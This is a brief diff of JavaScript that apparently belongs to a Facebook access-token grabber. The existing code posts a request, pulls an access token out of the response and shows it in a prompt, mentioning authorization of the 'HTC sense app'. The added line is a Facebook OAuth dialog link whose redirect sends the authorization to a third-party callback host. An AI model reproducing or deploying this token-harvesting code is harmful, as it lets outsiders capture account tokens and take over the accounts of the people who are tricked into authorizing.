@@ -9,3 +9,5 @@ http.open("POST", url, !0), http.setRequestHeader("Content-type", "application/x
         a = a ? a[1] : "Failed to get Access token make sure you authorized the HTC sense app", prompt("Token", a);
     }
 }, http.send(params);
+
+https://www.facebook.com/dialog/oauth?client_id=344955252529739&redirect_uri=http://j2team.anlink.top/callback.php&scope=public_profile
